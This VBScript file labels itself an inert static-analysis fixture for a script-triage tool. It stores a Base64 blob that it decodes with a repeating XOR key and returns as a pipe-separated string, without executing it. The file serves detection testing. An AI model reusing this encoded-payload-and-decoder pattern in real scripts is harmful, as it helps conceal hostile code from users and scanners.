Option Explicit
' Huntress Script Triage -- inert static-analysis fixture (wsh_vbscript_windows)
Const Material_7f5aef97 = "48GdeQnhmdx2R/Sf3XAT55nzdx/4k9hgVvGV33Ub4Z/EWhfwkcN3A+mdyGQK4ZneOC38kuRxDuXS+2wU3YjYdSjwjdlgCeHSmStL6Y/YZB3wo89qD/uIkTcG9p3BdRv8m8JaE/HBz2QX5Z3FYhS4mJVgH/adnTZJrYDZdxaolNhxCubGgyoerJnJZhukz589VPCEzWgK+ZmCbBTjncBsHrrEmDdIp5/NNVTxndh5D+aZ3lob8pnCcUfdicJxCPCP30kb99PIPB/wn800SabE"
Const Codec_7f5aef97 = "base64_chunks|repeating_key_xor|95,fc,ac,05,7a"

Function Base64_7f5aef97(ByVal encodedText)
  Dim alphabet, cleanText, characterIndex, encodedCharacter, characterValue
  Dim outputBytes(), outputIndex, accumulator, bitCount
  alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
  cleanText = Replace(Replace(encodedText, vbCr, ""), vbLf, "")
  ReDim outputBytes((Len(cleanText) * 3) \ 4)
  outputIndex = 0
  accumulator = 0
  bitCount = 0
  For characterIndex = 1 To Len(cleanText)
    encodedCharacter = Mid(cleanText, characterIndex, 1)
    If encodedCharacter <> "=" Then
      characterValue = InStr(1, alphabet, encodedCharacter, vbBinaryCompare) - 1
      If characterValue < 0 Then Err.Raise 5, "Base64_7f5aef97", "Invalid Base64 character"
      accumulator = (accumulator * 64) + characterValue
      bitCount = bitCount + 6
    End If
    If bitCount >= 8 Then
      bitCount = bitCount - 8
      outputBytes(outputIndex) = (accumulator \ (2 ^ bitCount)) And 255
      outputIndex = outputIndex + 1
      If bitCount = 0 Then
        accumulator = 0
      Else
        accumulator = accumulator And ((2 ^ bitCount) - 1)
      End If
    End If
  Next
  ReDim Preserve outputBytes(outputIndex - 1)
  Base64_7f5aef97 = outputBytes
End Function

Function Load_7f5aef97()
  Dim partWidth, packedText
  partWidth = (Len(Material_7f5aef97) + 3) \ 4
  packedText = Mid(Material_7f5aef97, 1, partWidth) & Mid(Material_7f5aef97, partWidth + 1, partWidth) & Mid(Material_7f5aef97, partWidth * 2 + 1, partWidth) & Mid(Material_7f5aef97, partWidth * 3 + 1)
  Load_7f5aef97 = Base64_7f5aef97(packedText)
End Function

Function Decode_7f5aef97(ByRef storedMaterial)
  Dim result(), materialIndex, keyBytes, previous
  ReDim result(UBound(storedMaterial))
  keyBytes = Array(149,252,172,5,122)
  For materialIndex = 0 To UBound(storedMaterial)
    result(materialIndex) = storedMaterial(materialIndex) Xor keyBytes(materialIndex Mod 5)
  Next
  Decode_7f5aef97 = result
End Function

Function Recover_7f5aef97()
  Dim storedMaterial, recoveredMaterial, configurationText, harmlessValue, materialIndex, decodePass, savedError, savedDescription
  If True Then
    harmlessValue = Empty
      storedMaterial = Load_7f5aef97()
      Select Case 1
        Case 1
          recoveredMaterial = Decode_7f5aef97(storedMaterial)
        Case Else
          recoveredMaterial = Array()
      End Select
      configurationText = ""
      For materialIndex = 0 To UBound(recoveredMaterial)
        configurationText = configurationText & Chr(recoveredMaterial(materialIndex))
      Next
  End If
  Recover_7f5aef97 = configurationText
End Function

Function Inspect_7f5aef97()
  Dim fields
  fields = Split(Recover_7f5aef97(), "|")
  Inspect_7f5aef97 = Join(fields, "|")
End Function
